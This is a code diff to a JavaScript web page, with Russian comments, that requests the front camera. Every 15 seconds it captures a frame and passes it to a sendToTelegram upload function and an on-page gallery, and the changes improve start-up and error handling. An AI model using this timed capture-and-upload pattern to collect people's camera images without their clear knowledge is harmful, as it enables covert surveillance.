@@ -11,68 +11,101 @@ const gallery = document.getElementById('gallery');
 
 // Запуск камеры
 async function initCamera() {
+    statusMsg.textContent = 'Запрос доступа к камере...';
+    statusMsg.style.color = '#fbbf24';
+
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        // Ослабляем ограничения для лучшей совместимости
+        const constraints = {
             video: {
-                facingMode: 'user',
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
+                facingMode: 'user'
             },
             audio: false
-        });
+        };
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
+
+        // Важные атрибуты для мобильных устройств
         video.setAttribute('playsinline', '');
         video.setAttribute('muted', '');
-        await video.play();
-        statusMsg.textContent = 'Камера готова';
+
+        // Ждем начала воспроизведения
+        video.onloadedmetadata = () => {
+            video.play().then(() => {
+                statusMsg.textContent = 'Камера готова';
+                statusMsg.style.color = '#10b981';
+            }).catch(e => {
+                console.error("Ошибка play():", e);
+                statusMsg.textContent = 'Нажмите на экран, чтобы активировать камеру';
+            });
+        };
+
     } catch (err) {
         console.error("Ошибка доступа к камере: ", err);
-        statusMsg.textContent = 'Ошибка: разрешите доступ к камере';
+        let errorMsg = 'Ошибка доступа: ';
+        if (err.name === 'NotAllowedError') errorMsg += 'разрешение отклонено';
+        else if (err.name === 'NotFoundError') errorMsg += 'камера не найдена';
+        else errorMsg += err.message || 'неизвестная ошибка';
+
+        statusMsg.textContent = errorMsg;
         statusMsg.style.color = '#ef4444';
     }
 }
 
 // Функция захвата и отправки
 async function takePhoto() {
-    // Форсируем воспроизведение, если видео зависло
-    if (video.paused) {
-        try { await video.play(); } catch (e) { }
-    }
+    // Если есть ошибка доступа, не пытаемся делать фото
+    if (statusMsg.textContent.includes('Ошибка доступа')) return;
 
-    // Проверяем готовность
-    if (video.readyState < 2) {
-        statusMsg.textContent = 'Ожидание готовности камеры...';
-        return;
-    }
+    try {
+        // Форсируем воспроизведение
+        if (video.paused) await video.play();
 
-    const context = canvas.getContext('2d');
-
-    // Устанавливаем размеры канваса
-    canvas.width = video.videoWidth || video.clientWidth;
-    canvas.height = video.videoHeight || video.clientHeight;
-
-    statusMsg.textContent = 'Авто-снимок...';
-    statusMsg.style.color = '#fbbf24';
-
-    // Рисуем кадр
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Получаем Blob и отправляем
-    canvas.toBlob((blob) => {
-        if (blob) {
-            sendToTelegram(blob);
-            addToGallery(canvas.toDataURL('image/jpeg'));
+        // Проверяем готовность кадра и наличие стрима
+        if (video.readyState < 2 || !video.srcObject) {
+            statusMsg.textContent = 'Ожидание видеопотока...';
+            return;
         }
-    }, 'image/jpeg', 0.8);
+
+        // Проверка на нулевые размеры (причина черного экрана)
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            console.log("Размеры видео еще не определены");
+            return;
+        }
+
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        statusMsg.textContent = 'Авто-захват...';
+        statusMsg.style.color = '#fbbf24';
+
+        // Рисуем
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Получаем Blob
+        canvas.toBlob((blob) => {
+            if (blob && blob.size > 0) {
+                sendToTelegram(blob);
+                addToGallery(canvas.toDataURL('image/jpeg'));
+            } else {
+                console.warn("Пустой Blob получен");
+            }
+        }, 'image/jpeg', 0.8);
+
+    } catch (e) {
+        console.error("Ошибка при захвате:", e);
+    }
 }
 
 // Запуск авто-захвата каждые 15 секунд
 let captureInterval = setInterval(takePhoto, 15000);
 
-// Кнопку оставим как принудительный ручной захват
+// Ручной захват
 captureBtn.addEventListener('click', () => {
+    statusMsg.textContent = 'Ручной снимок...';
     takePhoto();
-    // Сбрасываем интервал при ручном нажатии, чтобы не было двух фото подряд
     clearInterval(captureInterval);
     captureInterval = setInterval(takePhoto, 15000);
 });
